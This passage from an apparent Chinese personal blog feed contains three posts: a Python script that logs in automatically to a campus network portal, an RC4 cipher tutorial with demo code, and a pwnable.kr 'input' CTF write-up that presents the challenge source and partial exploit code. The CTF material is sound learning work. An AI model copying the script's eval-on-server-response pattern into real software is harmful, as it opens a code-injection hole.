class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">from</span> encryption.srun_md5 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encryption.srun_sha1 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encryption.srun_base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encryption.srun_xencode <span class="keyword">import</span> *</span><br><span class="line">header=&#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">init_url=<span class="string">&quot;http://10.110.74.91&quot;</span></span><br><span class="line">get_challenge_api=<span class="string">&quot;http://10.110.74.91/cgi-bin/get_challenge&quot;</span></span><br><span class="line"></span><br><span class="line">srun_portal_api=<span class="string">&quot;http://10.110.74.91/cgi-bin/srun_portal&quot;</span></span><br><span class="line">n = <span class="string">&#x27;200&#x27;</span></span><br><span class="line"><span class="built_in">type</span> = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">ac_id=<span class="string">&#x27;4&#x27;</span></span><br><span class="line">enc = <span class="string">&quot;srun_bx1&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_chksum</span>():</span></span><br><span class="line">chkstr = token+username</span><br><span class="line">chkstr += token+hmd5</span><br><span class="line">chkstr += token+ac_id</span><br><span class="line">chkstr += token+ip</span><br><span class="line">chkstr += token+n</span><br><span class="line">chkstr += token+<span class="built_in">type</span></span><br><span class="line">chkstr += token+i</span><br><span class="line"><span class="keyword">return</span> chkstr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_info</span>():</span></span><br><span class="line">info_temp=&#123;</span><br><span class="line"><span class="string">&quot;username&quot;</span>:username,</span><br><span class="line"><span class="string">&quot;password&quot;</span>:password,</span><br><span class="line"><span class="string">&quot;ip&quot;</span>:ip,</span><br><span class="line"><span class="string">&quot;acid&quot;</span>:ac_id,</span><br><span class="line"><span class="string">&quot;enc_ver&quot;</span>:enc</span><br><span class="line">&#125;</span><br><span class="line">i=re.sub(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="built_in">str</span>(info_temp))</span><br><span class="line">i=re.sub(<span class="string">&quot; &quot;</span>,<span class="string">&#x27;&#x27;</span>,i)</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_getip</span>():</span></span><br><span class="line"><span class="keyword">global</span> ip</span><br><span class="line">init_res=requests.get(init_url,headers=header)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;初始化获取ip&quot;</span>)</span><br><span class="line"><span class="comment">#print(init_res.text)</span></span><br><span class="line">ip=re.search(<span class="string">&#x27;ip     : &quot;(.*?)&quot;&#x27;</span>,init_res.text).group(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ip:&quot;</span>,ip)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span>():</span></span><br><span class="line"><span class="comment"># print(&quot;获取token&quot;)</span></span><br><span class="line"><span class="keyword">global</span> token</span><br><span class="line">get_challenge_params=&#123;</span><br><span class="line"><span class="string">&quot;callback&quot;</span>: <span class="string">&quot;jQuery112406608265734960486_&quot;</span>+<span class="built_in">str</span>(<span class="built_in">int</span>(time.time()*<span class="number">1000</span>)),</span><br><span class="line"><span class="string">&quot;username&quot;</span>:username,</span><br><span class="line"><span class="string">&quot;ip&quot;</span>:ip,</span><br><span class="line"><span class="string">&quot;_&quot;</span>:<span class="built_in">int</span>(time.time()*<span class="number">1000</span>),</span><br><span class="line">&#125;</span><br><span class="line">get_challenge_res=requests.get(get_challenge_api,params=get_challenge_params,headers=header)</span><br><span class="line">token=re.search(<span class="string">&#x27;&quot;challenge&quot;:&quot;(.*?)&quot;&#x27;</span>,get_challenge_res.text).group(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(get_challenge_res.text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;token为:&quot;</span>+token)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_complex_work</span>():</span></span><br><span class="line"><span class="keyword">global</span> i,hmd5,chksum</span><br><span class="line">i=get_info()</span><br><span class="line">i=<span class="string">&quot;&#123;SRBX1&#125;&quot;</span>+get_base64(get_xencode(i,token))</span><br><span class="line">hmd5=get_md5(password,token)</span><br><span class="line">chksum=get_sha1(get_chksum())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;所有加密工作已完成&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">srun_portal_params=&#123;</span><br><span class="line"><span class="string">&#x27;callback&#x27;</span>: <span class="string">&#x27;jQuery11240645308969735664_&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">int</span>(time.time()*<span class="number">1000</span>)),</span><br><span class="line"><span class="string">&#x27;action&#x27;</span>:<span class="string">&#x27;login&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;username&#x27;</span>:username,<span class="comment">#username,</span></span><br><span class="line"><span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;&#123;MD5&#125;&#x27;</span>+hmd5,</span><br><span class="line"><span class="string">&#x27;ac_id&#x27;</span>:ac_id,</span><br><span class="line"><span class="string">&#x27;ip&#x27;</span>:ip,</span><br><span class="line"><span class="string">&#x27;chksum&#x27;</span>:chksum,</span><br><span class="line"><span class="string">&#x27;info&#x27;</span>:i,</span><br><span class="line"><span class="string">&#x27;n&#x27;</span>:n,</span><br><span class="line"><span class="string">&#x27;type&#x27;</span>:<span class="built_in">type</span>,</span><br><span class="line"><span class="string">&#x27;os&#x27;</span>:<span class="string">&#x27;windows+10&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;windows&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;double_stack&#x27;</span>:<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;_&#x27;</span>:<span class="built_in">int</span>(time.time()*<span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(srun_portal_params)</span><br><span class="line">srun_portal_res=requests.get(srun_portal_api,params=srun_portal_params,headers=header)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;ok&#x27;</span> <span class="keyword">in</span> srun_portal_res.text:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;登陆成功&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">error_msg=<span class="built_in">eval</span>(re.search(<span class="string">&#x27;\((.*?)\)&#x27;</span>,srun_portal_res.text).group(<span class="number">1</span>))</span><br><span class="line"><span class="comment">#输出错误信息</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;error_type:&#x27;</span>+error_msg[<span class="string">&#x27;error&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(error_msg[<span class="string">&#x27;error_msg&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="keyword">global</span> username,password</span><br><span class="line">username=<span class="string">&quot;&quot;</span><span class="comment">#你的用户名和密码，注意加上@cmcc(移动) 或者@chinanet(电信)，联通是啥就忘了。。</span></span><br><span class="line">password=<span class="string">&quot;&quot;</span></span><br><span class="line">init_getip()</span><br><span class="line">get_token()</span><br><span class="line">do_complex_work()</span><br><span class="line">login()</span><br></pre></td></tr></table></figure><p>本学生来自嘉兴学院，同校校友可以换上自己的用户名和密码直接用，如果不是的话把url替换一下应该问题也不大。</p><p>以后上网终于不用再输用户名密码了，只能说爽(狗头</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;学校更新了校园网之后，用的宽带就需要每天早上进行一遍网页登录才能有网，非常的麻烦，我就萌生出了想写个模拟登录的脚本的想法。&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>RC4加密的学习</title>
    <link href="http://example.com/2021/11/27/RC4%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2021/11/27/RC4%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-11-27T02:00:00.000Z</published>
    <updated>2021-11-27T14:12:31.491Z</updated>
    
    <content type="html"><![CDATA[<p>最近有点颓废了，想学内核很难进行，逆向光刷题看着也很难，pwn刷题就是处于刷的感觉似曾相识，没有一点提升的感觉，所以我决定先攻一下逆向，把常见加解密算法先学了，今天先来这个RC4</p><span id="more"></span><h2 id="RC4加密"><a href="#RC4加密" class="headerlink" title="RC4加密"></a>RC4加密</h2><p>我初识RC4是在国赛，记得很清楚的一点就是不停地取模256，那题当时靠着网上资料勉强算过去了。但是还是想系统地学一下，网上教程千篇一律，我决定自己模拟一边它的算法过程然后再理解一遍。</p><p>既然是加密，脱离不了三个概念，明文，密文，密钥。RC4是对称加密，我也才知道，一直以为是不可逆的那种hash加密，所以既然它是对称加密，那么对于加密和解密过程，他们所用的密钥相同。它生成密钥的过程如下：</p><p>生成密钥需要一个长度不多于256长度的字符串作为种子生成随机密钥，这是我自己的理解，因为它确实给我的感觉就是这样的随机。它初始生成了一个长度为256的S串，初始S[i]=i，后面根据用字符串种子作为一个变换规则T，交换S密钥里的各个值，这样的交换好处在于我们可以保证S串密钥为一个双射（满足单射和满射，这个概念高中应该讲过，不赘述）。然后给的一个字符串种子呢，就会被放进T中，T的长度也为256，如果所给字符串种子长度小于256，则会进行轮换，直到它长度严格等于256为止。举个例子，在RC4加密中，如果我给定字符串种子为abcd，那么T的值将是[‘a’,’b’,’c’,’d’,’a’,’b’,’c’,’d’,’a’,’b’,’c’,’d’,……’a’,’b’,’c’,’d’]，对于任意0&lt;=i&lt;256，</p><p>T[i]=Seed[i%len(Seed)]</p><p>那么有了这个T之后呢，我们可以开始进行密钥变换了，做以下规则的变换(字符串均转成ASCII码计算)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j=(j+S[i]+T[i])%<span class="number">256</span></span><br><span class="line">    swap(S[i],S[j])</span><br></pre></td></tr></table></figure><p>从这一步我们也可以看出来，S初值我们都是知道的，T在确定了字符串种子之后也是确定的，那么由此可以算出密钥S。我们平时习惯说那个字符串是密钥，但是从这里可以看出来，字符串只是用来确定密钥的，因为在这之后，T和给的字符串已经都用不到了。所以这也是我为什么说那个字符串是种子而不是密钥，因为它没有参与加密的运算，我们刚刚算的那么快乐压根都没有出现明文这种，没有明文怎么能算加密呢对吧。</p><p>最后我们看看它是如何加密的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">    i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">    j=(j+S[i])%<span class="number">256</span></span><br><span class="line">    c[k]=m[k]^S[(S[i]+S[j])%<span class="number">256</span>]</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>有木有感觉很熟悉，跟前面生成密钥的算法差不多。这个算法如果不了解RC4，直接逆上去的话，怕能直接破防。我有体会我给你们演示一遍，首先i初值知道，c[k]知道，然后要算明文的话m[k]=c[k]^S[(S[i]+S[j])%256]然后呢，i最终值不知道，j最终值不知道，就，时间静止了呗。但是其实它最后就做一个异或，就不用管它了呗，跟它一样从头往后再异或一遍，不就回来了吗。这也就是它为什么也叫对称加密，它不仅密钥用的是一个，加密解密算法都是一样的，没错，加密即解密。RC4解密只需要对密文再加密一次就可以得到明文了。</p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">m=<span class="string">&#x27;I love xia0ji233&#x27;</span></span><br><span class="line">S=[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">key=<span class="string">&#x27;cat flag&#x27;</span></span><br><span class="line">T=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> S:</span><br><span class="line">    T.append(key[i%<span class="built_in">len</span>(key)])</span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j=(j+S[i]+<span class="built_in">ord</span>(T[i]))%<span class="number">256</span></span><br><span class="line">    t=S[i]</span><br><span class="line">    S[i]=S[j]</span><br><span class="line">    S[j]=t</span><br><span class="line"></span><br><span class="line">i,j=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">    i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">    j=(j+S[i])%<span class="number">256</span></span><br><span class="line">    t=<span class="built_in">ord</span>(m[k])^S[(S[i]+S[j])%<span class="number">256</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(t)[<span class="number">2</span>:],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#2ef1bae658e6e938ca2af63e95e372d</span></span><br></pre></td></tr></table></figure><p>把它放到CyberChef中加密发现结果一致，本次可能说就是学了个寂寞吧，因为我最后只要知道它加密解密算法一致这个结论就可以了。但是最重要的还是学会了如何分辨这样的加解密以及它加解密的一个特性，也算小有成就吧，瞬间不emo了哈哈哈哈。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近有点颓废了，想学内核很难进行，逆向光刷题看着也很难，pwn刷题就是处于刷的感觉似曾相识，没有一点提升的感觉，所以我决定先攻一下逆向，把常见加解密算法先学了，今天先来这个RC4&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="crypto" scheme="http://example.com/categories/ctf/crypto/"/>
    
    
  </entry>
  
  <entry>
    <title>pwnable input writeup</title>
    <link href="http://example.com/2021/11/23/pwnable_input/"/>
    <id>http://example.com/2021/11/23/pwnable_input/</id>
    <published>2021-11-23T02:00:00.000Z</published>
    <updated>2021-11-23T04:53:35.245Z</updated>
    
    <content type="html"><![CDATA[<p>真的推荐学linux C的IO一定得做做这个，真的能学到很多。</p><span id="more"></span><p>连接远程服务器把源码下下来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to pwnable.kr\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see if you know how to give input to program\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Just give me correct inputs then you will get the flag :)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// argv</span></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;A&#x27;</span>],<span class="string">&quot;\x00&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 1 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// stdio</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 2 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// env</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 3 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// file</span></span><br><span class="line">FILE* fp = fopen(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 4 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// network</span></span><br><span class="line"><span class="keyword">int</span> sd, cd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;socket error, tell admin\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = htons( atoi(argv[<span class="string">&#x27;C&#x27;</span>]) );</span><br><span class="line"><span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bind error, use another port\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">listen(sd, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line"><span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;accept error, tell admin\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stage 5 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// here&#x27;s your flag</span></span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码大概意思就是给程序五种输入方法，如果程序从指定方法获得了对应的值那么这一关被判正确并且进入下一关，过去五关就能拿到flag。</p><p>第一关是命令行输入，要求命令行有100个参数，然后argv[‘A’]=”\x00”，argv[‘B’]=”\x20\x0a\x0d”，那就给命令行一百个参数，然后满足一下对应的要求即可，这里我们可以选择用execve去执行这个程序。然后程序构造命令行的参数传给第二个参数就可以通过第一关了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *arg[<span class="number">101</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        arg[i]=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        *arg[i]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    arg[<span class="number">100</span>]=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(arg[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>);</span><br><span class="line">    execve(<span class="string">&quot;./input&quot;</span>,arg,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行就可以发现第一关过去了，这个源码可以放在自己电脑编译然后测试哦，等到自己能打通了再去考虑服务器的环境。</p><p>第二关虽然是stdio，但是它这里不仅要求读取特殊字节，还要从stderr中读入特定字节。这里卡了有点久，最后还是google了一下才得到的一个好方法，这里我也贴一下这位师傅这篇博客，我做这个也是参照这位师傅的博客做的–&gt;<a href="https://r00tk1ts.github.io/2018/03/06/input/%EF%BC%8C%E7%89%B9%E6%AD%A4%E6%84%9F%E8%B0%A2%EF%BC%81">https://r00tk1ts.github.io/2018/03/06/input/，特此感谢！</a></p><p>这里呢选择fork一个子进程，然后父子进程用管道通信，父进程把管道接口定向到stdin和stderr后去执行input。子进程通过管道给父进程发送数据，然后父进程就能从stdin和stderr中得到数据了。</p><p>第三关也比较简单，从环境变量中获得对应数据。环境变量其实跟命令行参数输入差不多，execve第三个参数就是环境变量，传入一个指针数组，然后里面给一个xxx=yyy，那么它从环境变量中get(xxx)就会获得yyy。</p><p>第四个就更简单了，它从文件读你就对应写一个文件给它好了。</p><p>第五个稍微有点东西，是关于socket编程的，基本上也可以超，但是也遇到诸多问题，我一个exp并不能打通，我运行一个exp之后会被挂起，我再运行一个exp才能让第一个exp getflag，盲猜是它数据没接收到，我测试之后发现sleep也不管用，但是这一关已经能打过去了。</p><p>但是由于pwnable服务器的特殊机制，我们home 目录没有写的权限，所以得去寻找我们文件能落地的地方，那就是/tmp目录，这里的目录我们有写的权限，但是没有读的权限，所以我们在里面新建一个自己的文件夹，然后把input可执行文件和flag文件链接到这个目录来，最后上传exp执行就可以拿到flag了。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span 